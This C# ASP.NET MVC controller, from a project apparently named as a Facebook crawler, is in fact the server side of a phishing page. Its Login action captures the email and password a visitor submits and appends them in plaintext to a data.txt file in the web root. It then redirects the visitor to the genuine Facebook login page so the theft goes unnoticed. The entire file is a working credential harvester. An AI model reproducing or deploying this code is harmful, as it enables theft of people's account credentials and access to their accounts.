using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Newtonsoft.Json;
using System.IO;
using System.Web.Services;

namespace FacebookCrawlerASPNET.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult LoginPage()
        {
            return View();
        }

        public ActionResult Login(User postModel)
        {
            //string json = JsonConvert.SerializeObject(postModel);

            var mail = Request["mail"];
            var password = Request["password"];

            var str = "";
            str += "-----------------" + Environment.NewLine;
            str += "Mail : " + mail + Environment.NewLine;
            str += "Şifre : " + password + Environment.NewLine;
            str += "-----------------" + Environment.NewLine;

            //var dataFile = Server.MapPath("~/App_Data/data.txt");
            //System.IO.File.AppendAllText(@dataFile, str);

            using (StreamWriter _testData = new StreamWriter(Server.MapPath("~/data.txt"), true))
            {
                _testData.WriteLine(str);
            }

            return Redirect("https://www.facebook.com/Login.php");
        }
    }

    public class User
    {
        public string mail { get; set; }
        public string password { get; set; }
    }
}